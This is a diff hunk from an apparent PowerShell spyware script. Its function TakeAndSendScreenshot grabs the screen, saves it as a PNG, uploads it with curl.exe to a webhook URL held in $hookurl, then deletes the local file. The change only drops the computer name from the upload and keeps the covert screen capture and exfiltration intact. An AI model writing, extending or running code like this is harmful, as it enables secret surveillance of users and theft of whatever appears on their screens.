@@ -22,9 +22,7 @@ Function TakeAndSendScreenshot {
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     Start-Sleep 1
-    $computerName = $env:COMPUTERNAME
-    $text = "Capture d'écran de $computerName"
-    curl.exe -F "file1=@$filett" -F "text=$text" $hookurl
+    curl.exe -F "file1=@$filett" $hookurl
     Start-Sleep 1
     Remove-Item -Path $filett
 }
